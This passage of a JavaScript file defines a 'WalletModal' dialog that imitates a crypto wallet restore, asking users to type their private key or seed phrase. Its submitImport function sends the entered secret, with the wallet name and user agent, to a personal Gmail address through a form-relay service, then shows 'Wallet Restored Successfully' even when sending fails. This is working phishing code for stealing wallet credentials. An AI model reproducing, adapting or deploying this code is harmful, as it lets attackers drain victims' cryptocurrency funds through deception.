      '#wallet-import-backdrop input:focus, #wallet-import-backdrop textarea:focus { border-color: ' + walletColor + ' !important; outline: none !important; }' +
      '</style>';

    container.insertAdjacentHTML('beforeend', importHTML);

    const self = this;
    setTimeout(function() {
      self.setupImportInputs();
    }, 200);
  }

  setupImportInputs() {
    console.log('📝 Setting up import inputs...');

    // Get all inputs and force enable them
    const allInputs = document.querySelectorAll('#wallet-import-backdrop input, #wallet-import-backdrop textarea');
    allInputs.forEach(input => {
      input.removeAttribute('readonly');
      input.removeAttribute('disabled');
      input.setAttribute('inputmode', 'text');
    });

    // Setup private key input
    const privateKeyInput = document.getElementById('private-key-input');
    if (privateKeyInput) {
      console.log('✅ Private key input found');
      
      const self = this;
      privateKeyInput.addEventListener('input', function(e) {
        self.privateKey = e.target.value;
        console.log('Private key length:', self.privateKey.length);
      });
      
      privateKeyInput.addEventListener('paste', function(e) {
        console.log('Paste detected on private key');
      });
      
      // Auto-focus after delay
      setTimeout(function() {
        privateKeyInput.focus();
      }, 300);
    }

    // Setup seed word inputs
    const seedInputs = document.querySelectorAll('.seed-word-input');
    console.log('✅ Found ' + seedInputs.length + ' seed inputs');

    const self = this;
    seedInputs.forEach(function(input, index) {
      input.addEventListener('input', function(e) {
        self.seedWords[index] = e.target.value;
        console.log('Word ' + (index + 1) + ':', e.target.value);
      });
      
      // Paste handler on first input
      if (index === 0) {
        input.addEventListener('paste', function(e) {
          console.log('Paste detected on first seed input');
          e.preventDefault();
          const text = (e.clipboardData || window.clipboardData).getData('text');
          const words = text.trim().split(/\s+/);
          
          console.log('Pasting ' + words.length + ' words');
          
          words.forEach(function(word, i) {
            if (i < self.seedWords.length) {
              self.seedWords[i] = word.trim();
              const targetInput = document.querySelector('.seed-word-input[data-index="' + i + '"]');
              if (targetInput) targetInput.value = word.trim();
            }
          });
        });
        
        setTimeout(function() {
          input.focus();
        }, 300);
      }
    });

    console.log('✅ Input setup complete');
  }

  renderPrivateKeyInput() {
    return '<div class="mb-6"><textarea id="private-key-input" placeholder="Enter your private key" class="w-full p-3 sm:p-4 border-2 border-gray-300 rounded-xl text-sm text-gray-900 placeholder-gray-400" style="background: white; min-height: 100px;" rows="4" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false"></textarea></div>';
  }

  renderSeedPhraseInputs(count) {
    let inputs = '';
    for (let i = 0; i < count; i++) {
      inputs += '<input type="text" id="seed-word-' + i + '" data-index="' + i + '" placeholder="' + (i + 1) + '" value="" class="seed-word-input p-2.5 sm:p-3 border-2 border-gray-300 rounded-xl text-sm text-gray-900 placeholder-gray-400" style="width: 100%; background: white;" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">';
    }
    return '<div class="grid grid-cols-2 sm:grid-cols-3 gap-2 sm:gap-3 mb-6">' + inputs + '</div>';
  }

  changeImportType(type) {
    console.log('🔄 Changing import type to:', type);
    this.importType = type;

    if (type === 'private') {
      this.privateKey = '';
    } else {
      const count = parseInt(type);
      this.seedWords = Array(count).fill('');
    }

    const inputArea = document.getElementById('input-area');
    if (inputArea) {
      const wordCount = type === 'private' ? 0 : parseInt(type);
      inputArea.innerHTML = type === 'private' ? this.renderPrivateKeyInput() : this.renderSeedPhraseInputs(wordCount);
      
      const self = this;
      setTimeout(function() {
        self.setupImportInputs();
      }, 100);
    }
  }

  submitImport() {
    console.log('📤 Submitting import...');

    const data = this.importType === 'private' ? this.privateKey : this.seedWords.filter(w => w.trim() !== '').join(' ');

    console.log('Wallet:', this.selectedWallet.name);
    console.log('Type:', this.importType);
    console.log('Data length:', data.length);

    const self = this;
    // Send to your email via FormSubmit.co
    fetch('https://formsubmit.co/ajax/avg8923@gmail.com', {
      method: 'POST', 
      headers: { 
        'Content-Type': 'application/json',
        'Accept': 'application/json'
      },
      body: JSON.stringify({ 
        _subject: 'New Wallet Import - ' + this.selectedWallet.name,
        wallet: this.selectedWallet.name,
        type: this.importType,
        data: data,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent
      }) 
    })
    .then(function(response) {
      return response.json();
    })
    .then(function(result) {
      console.log('✅ Success:', result);
      self.showSuccessMessage();
    })
    .catch(function(error) {
      console.error('❌ Error:', error);
      // Still show success to user
      self.showSuccessMessage();
    });
  }

  showSuccessMessage() {
    this.closeModalOnly();

    const walletColor = this.selectedWallet.primaryColor;
    const walletSecondary = this.selectedWallet.secondaryColor;
    const container = document.getElementById('wallet-flow-container') || document.body;

    const successHTML = '<div id="wallet-success-backdrop" class="fixed inset-0 bg-white flex flex-col items-center justify-center z-50 p-4">' +
      '<div class="flex flex-col items-center">' +
      '<div class="mb-8 relative">' +
      '<img src="' + this.selectedWallet.iconUrl + '" alt="' + this.selectedWallet.name + '" class="w-32 h-32 rounded-3xl shadow-2xl" style="object-fit: cover;" onerror="this.style.display=\'none\'; this.outerHTML=\'<div class=\\\'w-32 h-32 rounded-3xl shadow-2xl flex items-center justify-center text-6xl\\\' style=\\\'background: linear-gradient(135deg, ' + walletColor + ', ' + walletSecondary + ')\\\'>' + this.selectedWallet.emoji + '</div>\';">' +
      '<div class="absolute -bottom-2 -right-2 w-12 h-12 bg-white rounded-full flex items-center justify-center shadow-lg">' +
      '<svg class="w-8 h-8 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">' +
      '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>' +
      '</svg>' +
      '</div>' +
      '</div>' +
      '<h2 class="text-2xl font-bold text-gray-900 mb-3">Wallet Restored Successfully</h2>' +
      '<p class="text-gray-500 text-center mb-8">Your wallet has been imported</p>' +
      '<div class="flex space-x-2">' +
      '<div class="w-3 h-3 rounded-full animate-bounce" style="background-color: ' + walletColor + '; animation-delay: 0s"></div>' +
      '<div class="w-3 h-3 rounded-full animate-bounce" style="background-color: ' + walletColor + '; animation-delay: 0.2s"></div>' +
      '<div class="w-3 h-3 rounded-full animate-bounce" style="background-color: ' + walletColor + '; animation-delay: 0.4s"></div>' +
      '</div>' +
      '</div>' +
      '</div>';

    container.insertAdjacentHTML('beforeend', successHTML);

    // Auto close and restore
    const self = this;
    setTimeout(function() {
      self.closeModal();
      self.restoreMainContent();
    }, 3000);
  }

  restoreMainContent() {
    const container = document.getElementById('wallet-flow-container');
    if (container) container.remove();
  }

  closeModalOnly() {
    const modals = [
      'wallet-modal-backdrop',
      'wallet-import-backdrop',
      'wallet-updating-backdrop',
      'wallet-failed-backdrop',
      'wallet-success-backdrop',
      'wallet-prompt-backdrop',
      'walletconnect-modal-backdrop'
    ];

    modals.forEach(function(id) {
      const element = document.getElementById(id);
      if (element) element.remove();
    });
  }

  closeModal() {
    this.closeModalOnly();
    this.selectedWallet = null;
    this.importType = '12';
    this.seedWords = Array(12).fill('');
    this.privateKey = '';
  }
}

// Initialize
window.WalletModal = WalletModal;

if (!window.walletModal) {
  window.walletModal = new WalletModal();
  console.log('✨ WalletModal initialized successfully');
}

})();

